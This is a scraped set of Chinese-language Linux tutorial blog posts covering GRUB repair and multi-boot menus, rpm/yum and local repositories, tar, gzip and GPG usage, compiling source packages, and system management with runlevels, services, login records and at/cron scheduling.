建议/boot目录对应独立分区(必须是主分区 并且是ext2格式) grub grub.cfg 配置文件 丢失进入grub&gt; 命令行 i386-pc grub的模块目录 丢失进入grub rescue&gt; 命令行 vmlinuz-4.4.0-116-generic 内核文件 initrd.img-4.4.0-116-generic 临时文件系统 修复grub引导程序(BIOS + MBR)重启grub程序, 会自动将grub引导程序写入mbr并且固定在/boot目录下生成grub相关文件 grub-install /dev/sda ubuntu grub.cfg的自动生成 update-grub 问题: 根分区完整的前提下, 只是引导程序或相关文件丢失导致引导不了系统 借助第三方linux系统来进行修复 (U盘 网络 光盘) 首先进入第三方设备提供的linux系统: 1. 挂载修复系统的根分区 mount /dev/sda1 /mnt 2. 挂载boot分区到/mnt/boot目录下 mount /dev/sda3 /mnt/boot/ 3. 将内核相关目录挂载(proc sys dev tmp) mount -o bind /proc /mnt/proc/ mount -o bind /sys /mnt/sys/ mount -o bind /dev /mnt/dev/ mount -o bind /tmp /mnt/tmp/ 4. 切换到ubuntu系统(进入ubuntu的系统) chroot /mnt 5. 重装grub grub-install /dev/sda Grub引导其它系统前提: 将mint centos ubuntu的启动文件全部统一放在boot分区(/dev/sda3) grub ubuntu/mintw (hd0,3)/grub/grub.cfg grub2 centos7 (hd0,3)/grub2/grub.cfg centos7: initramfs-3.10.0-862.el7.x86_64.img vmlinuz-3.10.0-862.el7.x86_64 mint: initrd.img-4.15.0-20-generic vmlinuz-4.15.0-20-generic ubuntu: initrd.img-4.4.0-116-generic vmlinuz-4.4.0-116-generic ----------------------------------------------------------------------- grub命令行启动ubuntu: linux (hd0,3)/vmlinuz-4.4.0-116-generic root=/dev/sda1 quiet splash initrd (hd0,3)/initrd.img-4.4.0-116-generic boot grub命令行启动mint: linux (hd0,3)/vmlinuz-4.15.0-20-generic root=/dev/mapper/up-mint quiet splash initrd (hd0,3)/initrd.img-4.15.0-20-generic boot grub命令行启动centos: linux (hd0,3)/vmlinuz-3.10.0-862.el7.x86_64 root=/dev/mapper/up-centos quiet splash initrd (hd0,3)/initramfs-3.10.0-862.el7.x86_64.img boot -------------------------------------------------------------------------- grub.cfg配置菜单1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071# kyo grub config insmod all_video insmod gfxterm insmod gettextinsmod lvminsmod part_msdosinsmod ext2insmod exfatinsmod iso9660insmod loopbackinsmod jpeginsmod pnginsmod cryptodisk set gfxmode=auto set locale_dir=$prefix/locale set lang=zh_CN set timeout_style=menu set timeout=5 set default=0 background_image /boot/grub/bg.jpG menuentry 'Ubuntu 16.04' { linux (hd0,3)/vmlinuz-4.4.0-116-generic root=/dev/sda1 quiet splash initrd (hd0,3)/initrd.img-4.4.0-116-generic } menuentry 'Mint 19' { linux (hd0,3)/vmlinuz-4.15.0-20-generic root=/dev/mapper/up-mint quiet splash initrd (hd0,3)/initrd.img-4.15.0-20-generic } menuentry 'CentOS 7' { linux (hd0,3)/vmlinuz-3.10.0-862.el7.x86_64 root=/dev/mapper/up-centos quiet splash initrd (hd0,3)/initramfs-3.10.0-862.el7.x86_64.img } menuentry 'Window 7' { set root=(hd0,2) chainloader +1 } menuentry 'CentOS 7 Install' { set root=(hd0,6) linux /vmlinuz linux repo=hd:/dev/sda6:/ initrd /initrd.img } menuentry 'Mint 19 Install' { set root=(hd0,6) loopback loop /mint19.iso set root=(loop) linux /casper/vmlinuz boot=casper iso-scan/filename=/mint19.iso quiet splash -- initrd /initrd.img } menuentry 'Ghost' { set root=(hd0,6) linux16 /memdisk c=2000 h=4 s=36 floppy initrd /ghost.img } menuentry '重启' { reboot} menuentry '关机' { halt --no-apm}","link":"/2020/08/03/linux%E7%A3%81%E7%9B%98%E7%AE%A1%E7%90%86/"},{"title":"linux软件管理","text":"软件管理Linux 上常见的软件安装方式有rpm, yum, deb, apt-get, 编译源码. rpm: redhat package manager rpm 特定的压缩包 安装rpm包就是解压压缩包, 将编译过的文件打包按一定规则解压 rpm 命令即是解析压缩包 rpm包名 软件名-版本号.系统标识.CPU体系(平台)[.src].rpm zip-3.0-11.el7.x86_64.rpm zip 软件名 3.0-11 版本号 el7 系统标识(红帽7系统编译打包) x86_64 CPU体系, 体系不一样互相不兼容 noarch 此软件包与平台无关 rpm源码包 软件名-版本号.src.rpm 查找rpm: http://rpmfind.net 安装 rpm -ivh rpm包文件路径 -i 安装, 第二个进度条显示安装进度 -v 显示安装进度 -h 检验hash, 第一个进度条 两个进度完成代表安装成功 对rpm源码包进入安装， 会解压到家目录的rpmbuild目录下 查找某个命令的所属rpm包名 rpm -qf /usr/bin/wget 或 rpm -qf $(which wget) 查看当前系统安装所有rpm包 rpm -qa 查看是否安装某个包 rpm -qa wget 查看rpm包详细信息 rpm -qi $(which wget) 查看已安装rpm包的信息 rpm -qR wget-1.14-15.el7_4.1.x86_64 查看已安装rpm包会释放哪些文件信息 rpm -ql wget-1.14-15.el7_4.1.x86_64 卸载rpm包 格式: rpm -e rpm包名 例: 获取命令的路径 which wget 获取包名 rpm -qf /usr/bin/wget 卸载 rpm -e wget-1.14-15.el7_4.1.x86_64 一步到位 rpm -e $(rpm -qf $(which wget)) rpm安装选项 -U 升级安装 -F 强制安装 --prefix 指定安装路径, 一般推荐默认路径 --nomd5 不检验md5值 --test 测试在本系统是否能安装 ... 帮助信息: man rpm yumyum的命令形式一般是如下： yum –选项命令包 其中选项是可选的，选项包括-h（帮助），-y（当安装过程提示选择全部为”yes”），-q（ 不显示安装的过程）等等。[command]为所要进行的操作，[package …]是操作的对象。 yum的一切信息都存储在一个叫yum.reops.d目录下的配置文件中，通常位于/etc/yum.reops.d目录下。 在这个目录下面有很多文件，都是.repo结尾的，repo文件是yum源（也就是软件仓库）的配置文件，通常一个repo文件定义了一个或者多个软件仓库的细节内容，例如我们将从哪里下载需要安装或者升级的软件包，repo文件中的设置内容将被yum读取和应用！ 进入/etc/yum.repo.d目录下，vim CentOS-Base.repo [base]这个表示的是名称， #yum的ID，必须唯一，本地有多个yum源的时候，这里必须是唯一的 name=CentOS-$releasever - Base #具体的yum源名字，其实相当于对它的描述描述信息 $r releasever你可以使用这个变量参考红帽企业Linux发行版，也就是说表示当前发行版的大版本号。 baseurl是镜像服务器地址，只能写具体的确定地址。下面的例子中，只能有一个baseurl，但里面可以包含多个url mirrorlist 是镜像服务器的地址列表，里面有很多的服务器地址。这里有一个变量$arch，cpu体系，还有一个变量：$basearch，cpu的基本体系组 baseurl 和mirrorlist 都是指向yum源的地址，不同点是包含地址的多少。你若自己写的话，我们一般只写一个地址，直接用baseurl 就行 gpgcheck=0 #要不要验证呢，取消验证。1，使用公钥检验rpm的正确性。 gpgcheck 若是1将对下载的rpm将进行gpg的校验，校验密钥就是gpgkey，一般自己的yum源是不需要检测的。gpgcheck=0，那么gpgkey就可以不填写 在来看一下/etc/yum.conf 文件 cachedir=/var/cache/yum #yum下载的RPM包的缓存目录 keepcache=0 #缓存是否保存，1保存，0不保存。 debuglevel=2 #调试级别(0-10)，默认为2 logfile=/var/log/yum.log #yum的日志文件所在的位置1 yum清空缓存列表 1234567yum clean packages 清除缓存目录下的软件包，清空的是(/var/cache/yum)下的缓存yum clean headers 清除缓存目录下的 headersyum clean oldheaders 清除缓存目录下旧的 headersyum clean, yum clean all (= yum clean packages; yum clean oldheaders) 清除缓存目录下的软件包及旧的headers更新配置后yum缓存(索引缓存) yum makecache 2 yum显示信息 12345678910111213yum list # yum list显示所有已经安装和可以安装的程序包这些列表里面的包的来源就是/etc/yum.repo.d。 base docker-ce-stable epel/x86_64/metalink epel extras rpmforge updates yum list rpm 显示安装包信息rpm显示installed ，这里是包名，版本和仓库名yum list httpd这里是可获得包，说明还没有安装。yum info rpm 显示安装包rpm的详细信息 3 yum安装 12345678910111213yum -y install httpd如果你不加-y他会问你要不要安装。如果你想自己来控制有些包是否安装，这里不要加-y，如果你想自动安装，不进行交互，这里加入-y。这个就是yum 的安装了，非常简单。安装完之后查询一下yum list httpd，Installed 说明已经安装好了查找软件包释放文件包含关键词的条目 适用于知道命令，但是不知道软件名的情况下载 yum provides &quot;/etc/mime.types&quot; yum provides */nslookup 这样匹配也可以 yum provides nslookup 也可以 4 yum删除 123yum remove httpd 删除程序包httpd ，也就是卸载。yum deplist rpm 查看程序rpm依赖情况 5 yum包的升级 12345yum check-update 检查可更新的程序 yum update 全部更新，升级所有包，以及升级软件和系统内核，这就是一键升级。他可以更新CentOS的内核到最新版本。 yum update package1 更新指定程序包package1， yum upgrade package1 升级指定程序包package1 6 yum 解决依赖的原理 YUM 解决依赖关系问题，自动下载软件包。yum是基于C/S架构。C指的是客户端， S指的是服务器，想ftp，http,file、关于yum为什么能解决依赖关系：所有的Yum 源里面都有repodata，它里面是有XML格式文件，里面有说明需要什么包。例如上堂课实验的：mysql-server rpm 需要：perl-DBI ，python，或者是php等等包。 7 yum 组的管理 yum进行安装的时候可以一组一组的进行安装，先来看看有那些组yum grouplist 。可用的组有这么多。 Available Environment Groups:首先是可用的环境分组。 Compute Node 计算节点 Infrastructure Server 基础设施服务器 File and Print Server 文件和打印服务 Cinnamon Desktopv Cinnamon桌面 Installed Groups :已安装的组，开发工具 Development Tools Available Groups:可用的组。 如果我们想以组的方式来安装，加入我想安装安全工具： 输入：yum groupinstall &quot;Security Tools&quot; 看到这里询问是否要安装，当然是N不安装了。如果想直接安装，不询问的话，这里也在后面加上选项 –y。 yum groupremove group1 删除程序组group1 根据包名查找软件名 yum search vim 重装软件 yum reinstall vim -y 查看软件组 yum grouplist &quot;GNOME Desktop&quot; 安装软件组 这时候init 5 可以切换到桌面模式 yum groupinstall &quot;GNOME Desktop&quot; 卸载软件组 卸载后就不可以init 5 切换了 yum groupremove &quot;GNOME Desktop&quot; 常用的yum 命令 yum list &lt;-- 列出yum源中提供的所有软件 yum grouplist &lt;-- 以分组的形式列出yum源中提供的所有软件 yum search screen &lt;-- 搜索名字或者描述信息中包含了字符串screen的包 yum provides &quot;*bin/screen&quot; &lt;-- 搜索提供了某个文件的包 yum install screen &lt;-- 安装名为screen的包 yum remove screen &lt;-- 删除名为screen的包 yum groupinstall &quot;Development tools&quot; &lt;-- 安装名为Development tools的一组包 yum groupremove &quot;Development tools&quot; &lt;-- 删除名为Development tools的一组包 yum deplist screen &lt;-- 查看包screen的依赖关系 yumdownloader --destdir=/tmp screen &lt;-- 把screen的安装包从仓库下载下来，放到/tmp里面 yum clean all &lt;-- 清空yum 的数据库等 配置本地yum 源： 理解yum 的原理和yum 源的架构（结构） 1.1 yum 的配置文件 1.2 rpm 文件及相关数据 1.3 yum 运行的时候会检查配置，从配置里面得知软件的各种信息 其中就包括了rpm 的位置，是否检查签名，等等。 准备材料 (iso 文件) mkdir /yum &lt;– 预备目录 mount -ro loop centos.iso /yum &lt;– 挂载iso或者： mount /dev/sr0 /yum 书写yum 的配置文件 3.1 yum 源里面有仓库 3.2 yum 的配置文件存放在 /etc/yum.repos.d 目录里面 名字必须以 .repo 结尾 sudo mkdir back_repo sudo mv Centos-* ./back_repo sudo vim local.repo 假设iso 挂载在 /yum，则可以这样书写仓库信息： ------------------------------------- [repodata] &lt;-- 标题 name=repodata &lt;-- 名字 baseurl=file:///yum/ &lt;-- rpm 的位置 enabled=1 &lt;-- 是否启用该仓库, 0不启用, 1启用 gpgcheck=0 &lt;-- 是否检查rpm 包的数字签名 ------------------------------------- 清空yum已存在的所有源信息 yum clean all 查看本地源的所有软件 yum list 测试: 拔掉网线运行命令 sudo yum install vim -y 看结果是没有网路还是软件包是最新的 开机自动挂载 sudo vim /etc/fstab /dev/sr0 /yum iso9660 loop,defaults 0 0 iso光盘文件的路径 挂载文件 格式 光盘挂载的格式 开机不自检 设置开机自动挂载后，配置写错，会导致开不了机，需要重新配置 配置yum源配置最快yum源 12yum install yum-fastestmirror -y 资源真的是非常丰富，从Centos到Ubuntu，ISO镜像、升级包，应有尽有， yum源安装软件常见报错报错一，yum源路径网络问题 12345yum makecache 更新Yum仓库报错。修改epel.repo文件， 把#baseurl 这行的注释打开。把metalink 这个注释掉。保存退出 报错二证书问题。 1234567centos下安装完EPEL源然后更新一下yum缓存如果发现这样的错误:Error: Cannot retrieve metalink for repository: epel. Please verify its path and try again这就表明你需要更新CA证书了，那么只需要更新CA证书就可以，不过在此同时需要临时禁用epel源并更新就可以了，命令如下：yum --disablerepo=epel -y update ca-certificates 或者yum update -y ca-certificates然后在 yum makecache 就可以了。 报错三网络问题 1234有时候 iptables ouput 出数据有问题，把udp类型的数据改为可以出，相关代码为iptables -A OUTPUT -p udp -m state --state new,established -j ACCEPT iptables -A OUTPUT -p all -m state --state new,established -j ACCEPT 然后 yum makecache 就可以了。 报错四yum源网络问题 12345678910111213141516171819202122232425使用 yum安装的时候解决方案1.首先进入 /etc/yum.rebpos.d 目录备份文件 CentOS-Base.repo,执行cp CentOS-Base.repo CentOS-Base.repo.bak2.修改CentOS-Base.repo文件htpp://mirrors.cloud.aliyuncs.com/centos/批量替换为 http://mirrors.aliyun.com/centos执行：%s#http://mirrors.cloud.aliyuncs.com/centos/#http://mirrors.aliyun.com/centos#g3.备份epel.repo文件http://mirrors.cloud.aliyuncs.com/centos/批量替换为http://mirrors.aliyun.com/centos,执行 cp epel.repo epel.repo.bak4.修改epel.repo文件 %s#http://mirrors.cloud.aliyuncs.com#http://mirrors.aliyun.com#g5.执行yum -y update 报错五yum源镜像缓慢 1234567891011yum源。先把原来的CentOs-Base.repo 源进行重命名。或者禁用。然后选择下面的源。yum-config-manager --add-repo=http://mirrors.aliyun.com/repo/Centos-7.repoyum clean all 清除缓存重新构建rpm库rpm --rebuilddb然后在yum makecache fast Linux yum-config-manager命令YUM配置管理功能描述 使用yum-config-manager命令可以进行YUM配置管理。 命令语法 yum-config-manager [选项] [部分] 选项含义 -e&lt;错误级别&gt; 错误输出级别 选项 含义 -d&lt;调试级别&gt; 调试输出级别 -c&lt;配置文件&gt; 指定配置文件的位置 -t 错误宽容 -q 安静模式 -v 详细操作 -y 对所有问题回答yes –installroot=&lt;路径&gt; 设置安装根路径 –nogpgcheck 禁用GPG签名检查 –disableplugin=&lt;插件&gt; 按名称禁用插件 –color=&lt;颜色&gt; 控制使用颜色 –setopt=&lt;设置选项&gt; 设置任意配置和软件仓库选项 –noplugins 禁用yum插件 –enableplugin=&lt;插件&gt; 按名称启用插件 –enablerepo=&lt;软件仓库&gt; 启用一个或多个仓库 –rpmverbosity=&lt;调试级别&gt; 为rpm指定调试输出级别 –disablerepo=&lt;软件仓库&gt; 禁用一个或多个软件仓库 –disablepresto 禁用Presto插件，不下载任何deltarpm -C 从系统缓存中完全运行，不更新缓存 -R&lt;等待时间&gt; 最大命令等待时间，单位是分钟 –showduplicates 在软件仓库，在列表/搜索命令中显示重复的 -x&lt;软件包&gt; 按名称或排除软件包 –obsoletes 在更新过程中启用废弃处理 –save 保存当前的选项 –enable 启用指定的软件仓库 –disable 禁用指定的软件仓库 –add-repo=&lt;软件仓库&gt; 从指定文件或URL添加（和启用）软件仓库 进行YUM配置管理。[root@localhost ~]# yum-config-manager 安装yum-config-manager命令系统默认没有安装这个命令，这个命令在yum-utils 包里，可以通过命令yum -y install yum-utils 安装就可以了。 1yum -y install yum-utils 列： 从指定url中添加启用yum软件仓库 1yum-config-manager --add-repo=http://mirrors.aliyun.com/repo/Centos-7.repo 显示main和repos foo和bar的配置： 1yum-config-manager main foo bar 使用–enable显示启用的软件仓库： 1yum-config-manager --enable 禁用软件仓库epel 1yum-config-manager --disable epel 启用软件仓库epel 1yum-config-manager --enable epel 打包/解包(tar)选项 -f 指定操作文件 -c 打包 -x 解包 -C 指定解包路径 -v 显示过程 -t 列表包内容 -r 追加 (同一文件会追加多次) -u 更新 (文件不存在追加，文件存在对比时间进行更新操作) -d 对比包内容 --delete 删除包内容 -z 调用gzip工具(czf 代表打包压缩, xzf 代表解压解包) -j 调用bzip2工具(cjf 代表打包压缩, xjf 代表解压解包) -J 调用xz工具(cJf 代表打包压缩, xJf 代表解压解包) 打包 格式: tar -cf 压缩之后的文件路径 要进行压缩的文件夹路径... tar -cf /tmp/etc.tar /etc/ 打包etc到标准输出, 用于与其它组合使用 tar -cf - /etc/ 打包过滤文件或目录 tar -cf /tmp/etc.tar /etc/ --exclude=wgetrc --exclude=vim 万能压缩 格式: tar -cf 压缩之后的文件路径 要进行压缩的文件夹路径... tar -czf /tmp/etc.gz /etc #把access.log 日志打包压缩，保存在/etc/nginx/logs/目录下。命名为access.log.gz tar -czf /etc/nginx/logs/access.log.gz /etc/nginx/logs/access.log 2&amp;&gt; /dev/null 解包 格式: tar -xf 解包文件路径 [指定提取文件...] [-C 指定解压路径] tar -xf /tmp/etc.tar tar -xf /tmp/etc.tar -C /dev/shm/ tar -xf /tmp/etc.tar wgetrc 查看包 格式: tar -tf 查看包的路径 更新包 格式: tar -uf 压缩包路径 要追加的文件或目录路径... 删除包内容 格式: tar -f 包路径 --delete 要删除文件或目录 对比包内容 格式: tar -df 包路径 对比文件或目录路径 gzip格式打包压缩 tar -czf etc.tar.gz /etc gzip格式解压 tar -xzf etc.tar.gz bzip2格式打包压缩 tar -cjf etc.tar.gz /etc bzip2格式解压 tar -xjf etc.tar.gz 万能解压 tar -xf etc.tar tar -xf etc.tar.gz tar -xf etc.tar.bz2 tar -xf etc.tar.xz 压缩/解压 windows: winrar *.rar (收费) winzip *.zip linux: compress *.Z (过时) gzip *.gz / *.tar.gz / *.tgz bzip2 *.bz2 / *.tar.bz2 xz *.xz / *.tar.xz zip/unzip *.zip rar *.rar 压缩: 先用tar进行打包，再调用对应压缩工具进行压缩 解压: 先调用对应压缩工具解压，再用tar进行解包 gzip 压缩 gzip 文件 不删除原文件压缩 gzip -c 文件 &gt; gz压缩文件 解压 gzip -d gz压缩文件 查看gz压缩文件 zcat gz压缩文件 zless gz压缩文件 对比两个gz压缩文件 zcmp gz压缩文件1 gz压缩文件2 bzip2 压缩 bzip2 文件 不删除原文件压缩 bzip2 -c 文件 &gt; bz2压缩文件 解压 bzip2 -d bz2压缩文件 xz 用法与bzip2/gzip工具一样 zip 压缩 zip -r zip压缩名 要压缩的文件或目录... 解压 unzip zip压缩名 rar 压缩 rar a rar压缩名 要压缩的文件或目录路径... 解压 rar x rar压缩名 保留压缩包里目录结构 rar e rar压缩名 将压缩包的文件直接提取, 不保留压缩包目录结构 GPG - 文件加密非对称加密(公钥/私钥) RSA算法 公钥负责加密， 私钥负责解密 GNUPG开源工具实现非对称加密 安装: centos: yum install gnupg -y 查看当前系统所有密钥对 gpg --list-keys 创建密钥对 gpg --gen-key 1. 选择什么加密算法(推荐默认, 直接按回车) 2. 确定密钥长度 (默认为2048) 1024 2048 4096(长度越长越安全, 生成密钥时间就越久) 3. 确定密钥的有效时间 (默认为永不过期) 4. 确认以上是否正确 5. 输入密钥信息(姓名 邮箱 注释) 6. 输入密钥保护密码 加密 gpg -r 密钥标识 [-o 加密生成文件路径] -e [准备要加密的文件] 默认生成加密文件格式为二进制, 通过-a选项指定生成文件格式为文本格式 如果不指定加密生成文件路径，则输出到标准输出 如果加密文件不指定则读标准输入 密钥标识为生成密钥对的时候输入的真实姓名或者邮箱 加密/etc/passwd文件, 生成文本加密文件到/tmp/test/gpg.file gpg -r 1234567@163.com -o /tmp/test/gpg.file -a -e /etc/passwd 解密 gpg -r 密钥标识 [-o 解密生成文件路径] -d [gpg加过密的文件] 如果不指定解密生成文件， 解密到标准输出 如果不指定加过密的文件， 将标准输入作为源文件 公钥导出 格式: gpg [-a] -o 公钥导出路径 --export 密钥标识 gpg -a -o public.key --export 1234567@163.com 私钥导出 格式: gpg -a -o 私钥导出路径 --export-secret-keys 密钥标识 gpg -a -o private.key --export-secret-keys 1234567@163.com 密钥导入 格式: gpg --import 密钥导出文件 私钥导入设置密钥信任(不设置每次加密都会提示信任问题): gpg --edit-key 1234567@163.com trust quit 选择5最高信任级别, 再按Y确认退出 上传公钥 gpg --keyserver hkp://keys.gnupg.net --send-keys 公钥ID 查找公钥 gpg --keyserver hkp://keys.gnupg.net --search-keys 公钥标识 源码包编译安装大部分源码包使用autoconf项目自动生成编译环境 源码包即是压缩包, 首先必须解压并且进入解压后目录 tar -xf wget-1.14.tar.xz cd wget-1.14 INSTALL 安装帮助文档 ./configure --help 获取安装帮助信息 清除上一次编译情况 make clean make disclean 探测操作系统环境是否满足本项目的依赖 (配置项目功能) ./configure 如果没有任何错误才能进行下一步 错误一般都依赖的工具或库没有安装或者版本不对 编译 sudo make -j4 -j4 代表开多核执行 安装 sudo make install 卸载 sudo make uninstall 作业: centos7安装以下源码包 rpm源码包安装演示 wget-1.14-15.1.src.rpm 终端打字程序 ptyping-1.0.1.tar.gz 支持ntfs格式挂载 ntfs/ntfs-3g-2009.4.4.tgz mplayer播放器 MPlayer-1.2.tar.xz yasm 星际译王 stardict/stardict-3.0.2.tar.bz2 计算机词库: stardict-kdic-computer-gb-2.4.2.tar.tar … sudo yum install gcc -y ./configure --disable-gucharmap --disable-festival scene.hpp +21 NULL NULL -&gt; 0 依赖: intltool sudo yum install intltool -y gnome-doc-utils sudo yum install gnome-doc-utils enchant-devel sudo yum install enchant-devel gucharmap-devel 安装之后还会提示错误， 版本不对应 通过禁用此插件来继续编译 ./configure --disable-gucharmap festival-devel 安装之后还会提示错误 ./configure --disable-gucharmap --disable-festival 6-rhel-6/naulinux-school-x86_64/stardict-3.0.2-1.el6.x86_64.rpm/download/ espeak-devel sudo yum install espeak-devel -y libgnomeui-2.0-devel sudo yum install libgnomeui-devel libz sudo yum install gcc-c++ -y scrollkeeper-config sudo yum install scrollkeeper -y 坦克大战 662206tank-sdl-0.3.0.tar.gz sudo yum install libsdl1.2-dev libsdl-image1.2-dev libsdl-mixer1.2-dev -y 仙剑1 123456789sdlpal cd sdlpal/code make clean make vim nbproject/Makefile-Release.mk LDLIBSOPTIONS=-lm -lSDL cp dist/Release/GNU-Linux-x86/sdlpal .. cd .. ./sdlpal 编译C代码遇到通用问题: 问题: 找不到*.h文件 解决: 绝对使用-I解决 已知依赖的*.h文件在哪(不知道则需要查找系统或者百度) 通过-I选项告诉gcc我们头文件在哪 gcc -I/kyo/code/include Makefile里通过CFLAGS变量来指定头文件路径 CFLAGS=-I/kyo/code/include 问题: libSDL.so: undefined reference to `_XGetRequest' 解决: 绝对使用-l解决 Makefile里通过LDFLAGS 或 LIBS变量来指定库 LDFLAGS=-lX11 LIBS=-lX11 问题: ld: 找不到 -lSDL 解决: 绝对使用-L解决 Makefile里通过LDFLAGS 或LIBS 变量来指定库的路径 LDFLAGS=-L/kyo/code/lib -lSDL -lSDL_image -lSDL_mixer -lX11 问题: error while loading shared libraries: libSDL_image-1.2.so.0 解决: 前提系统已安装好此库,并且知道库所在路径 系统标准库路径: /usr/lib /lib 临时解决: 通过LD_LIBRARY_PATH环境变量来指定库路径 export LD_LIBRARY_PATH=/kyo/code/lib ./tank 永久解决: /etc/ld.so.conf 将依赖库路径追加到/etc/ld.so.conf, 再刷新动态库路径: sudo ldconfig sdl库源码包 sdl 编译SDL-1.2: 错误： operand type mismatch for `movq' 解决: ./configure --disable-assembly 错误: ./src/video/x11/SDL_x11sym.h:168:17: error: conflicting types for ‘_XData32’ 解决: vim ./src/video/x11/SDL_x11sym.h +168 SDL_X11_SYM(int,_XData32,(Display *dpy,register _Xconst long *data,unsigned len),(dpy,data,len),return) 错误: undefined reference to `_XGetRequest' 解决: vim Makefile +171 LIBS = -L/kyo/code/lib -Wl,-rpath,/kyo/code/lib -lSDL -lpthread -lX11","link":"/2020/08/03/linux%E8%BD%AF%E4%BB%B6%E7%AE%A1%E7%90%86/"},{"title":"linux系统管理","text":"一. 系统管理启动流程 通电 -&gt; 执行主板内置程序(BIOS/UEFI) -&gt; Grub(/boot/grub/grub.cfg) -&gt; /boot/vmlinuz* (Linux 核心程序) 挂载临时文件系统(initrd*) -&gt; 挂载根分区(/etc/fstab) -&gt; systemd(启动第一个进程) -&gt; /etc/init/*.conf (运行所有配置文件) -&gt; rc-sysinit.conf 定义操作系统运行级别 -&gt; rcS.conf -&gt; rc.conf (开机运行的服务 /etc/rc*.d/*) -&gt; lightdm.conf 图形界面 -&gt; rc.local 执行的最后一个脚本(用于用户自定义执行的脚本) -&gt; 用户登录 -&gt; /etc/profile 任何用户登录就会执行的脚本 -&gt; /etc/profile.d/*.sh -&gt; /etc/bash.bashrc 终端启动全局配置文件 -&gt; ~/.profile 用户登录 执行登录用户相关配置, 用户登录就会执行 -&gt; ~/.bashrc 用户终端配置, 用户打开终端就会执行 -&gt; ~/.bash.logout 用户登出执行脚本 图形界面的自动启动配置文件 /etc/xdg/autostart/*.desktop [Desktop Entry] Type=Application Name=KyoTerminal Comment=kyo autostart terminal Icon=preferences-desktop-screensaver Exec=gnome-terminal 必须给可执行权限，否则没有作用 /etc/X11/xinit/xinitrc.d/*.sh systemd 启动配置目录 /etc/init/ 服务的启动程序 /etc/init.d/ 系统运行级别系统的运行级别，是一种预定义的系统运行状态，一般来说，linux 支持以下几种 运行级别。下面关于各个运行级别的描述，只是指一般的配置，不同的发行版， 甚至相同发行版的不同版本，配置都不尽相同。 0：关机 1: 单用户模式 2：多用户模式，一般没有网络功能 3：多用户模式，通常有网络功能，没有图形界面，服务器基本上都是用这个级别 4：一般不使用, 预留, 未使用 5：多用户模式，通常有网络功能，有图形界面 6：重启 init 3 &lt;-- 切换到运行级别3 init 5 &lt;-- 切换到运行级别5 runlevel &lt;-- 查询运行级别 who -r &lt;-- 也可以查询运行级别 开机是否启动 服务与运行级别相对应 /etc/rc*.d/ 对/etc/rc*.d目录下的文件操作即可操作开机是否启动 rc*.d目录下的文件名第一个字母代表开机是否启动 K 开机不启动 S 开机启动 数字 启动顺序 设置开机是否启动只需要修改对应运行级别目录的文件名 centos6: chkconfig chkconfig --level 5 服务名 off chkconfig --level 5 服务名 on centos7: systemctl systemctl disable 服务名[.service] systemctl enable 服务名[.service] ubuntu: sysv-rc-conf 启动/关闭/重启/查询系统服务 开启network服务 sudo service network start 或 sudo systemctl start network.service 停止network服务 sudo service network stop 或 sudo systemctl stop network.service 重启network服务 sudo service network restart 或 sudo systemctl restart network.service 查看network服务的状态 sudo service network status 或 sudo systemctl status network.service 同样可以直接调用下面的脚本实现相同的目的 /etc/init.d/network start /etc/init.d/network stop /etc/init.d/network restart /etc/init.d/network status service命令调用的是systemctl命令 systemctl命令最终调用的是/etc/init.d/下面的脚本 命令 who 也可以用来查看在线用户，此外还有别的用途 who -b 系统引导 2018-10-24 23:49 &lt;--- 最后一次系统启动时间 who -aH &lt;--- 列出当前用户的信息 名称 线路 时间 空闲 进程号 备注 退出 系统引导 2018-10-25 17:56 运行级别 5 2018-10-25 09:56 soul ? :0 2018-10-25 09:56 ? 2115 (:0) soul + pts/0 2018-10-25 09:57 旧的 3201 (:0) 给登录的用户发送消息 write soul /dev/pts/1 &lt;--- 给指定的一个用户发消息，按Ctrl + D 结束 wall &lt;--- 给所有的用户发消息，按Ctrl + D 结束 mesg n &lt;--- 关闭接受消息的功能，这样普通用户就无法给该用户发送消息 mesg y &lt;--- 打开接受消息的功能 echo &quot;Message content&quot; &gt; /dev/pts/1 &lt;--- 就算该用户关闭了接受消息的功能，仍然可以给他发送 列出系统用户登入登出的历史记录 last &lt;--- 所有用户的登入登出时间 last -F &lt;--- 打印完整的时间 last -x | grep -E '^(shutdown|reboot)' &lt;--- 查看开机关机时间 last命令列出登录成功的记录，如果需要查询登录失败的记录，可以使用 lastb 命令, 默认只有root用户才能看到这些记录。 lastb root ssh:notty 192.168.224.11 Fri Feb 14 04:59 - 04:59 (00:00) ls -l /var/log/btmp #登录失败的信息是在这个文件里面 -rw-------. 1 root utmp 6528 May 9 19:26 /var/log/btmp lastlog 列出系统用户最近的一次登录记录，如果把一个用户删除了，用这个命令就 看不到他的记录了，不过用命令last还能看到。 请留意，lastlog 不显示从图形界面登入的记录。 二. 定时任务当需要周期性地重复执行任务，或者需要在将来某个时间点执行某个任务时，可以使用定时任务系统中。 常用的定时任务的服务: at/atd crontab/cron anacron at 定时执行任务, 如果设定时间点过了，任务失效, 任务只是一次性 at保证运行正常必须保证服务正常运行 yum install -y at sudo systemctl status atd.service 假如不是运行状态的话, 就运行 sudo systemctl restart atd.service at 10:00 2018-10-31 定义2018年10月31号10点执行 at&gt; echo $(date +&quot;%F %T&quot;) &gt;&gt; /tmp/tmpfile at&gt; (ctrl + d) at -l 查看任务列表 at -c 3 查看id为3的任务的详情 at -d 3 删除id为3的任务 at -f test.sh 10:00 2018-10-31 定义脚本执行的时间 at -f test.sh now +1 minutes 定义一分钟后执行脚本 at -f test.sh now +2 hours 定义2个小时后执行脚本 ps: 这个脚本不需要执行权限也可以完成, 但是必须要有读的权限 假如连读的权限读没有的话, 需要用sudo去添加定时任务, 可以执行成功, 但是这个任务会一直存在, 不会主动删掉 ... 权限控制 /etc/at.deny 里面存储拒绝运行at服务用户名单 允许其他的所有用户， 拒绝此文件里面的用户 /etc/at.allow 里面存储允许运行at服务用户名单 拒绝其他的所有用户，允许此文件里面的用户 at.allow 和 at.deny 不能同时存在， 同时存在at.allow优先级高 cron:能按照精确到分钟的时间去执行命令，此外，通常还可以设定cron按照 每小时，每天，每周，每月，每年的频率去执行任务。 cron的定时任务，如果因为电脑关闭而无法在指定时间执行，开机之后是否会 执行，取决于该任务定义在哪个配置文件中，如果是定义在 /etc/anacrontab 中，则会执行，否则就不执行。 linux下定时任务的实现，是依靠一个后台运行的系统服务crond(就是一个后台进程而已), 该服务每分钟检查一次，并执行符合条件的任务。 sudo service crond status 运行man 8 cron 查看cron的man文档，可以看到关于cron的行为的详细描述 crond检查定时任务的时候，会检查以下配置文件和目录: /etc/anacrontab 通常用来设定需要每天，每周，每月周期执行的任务 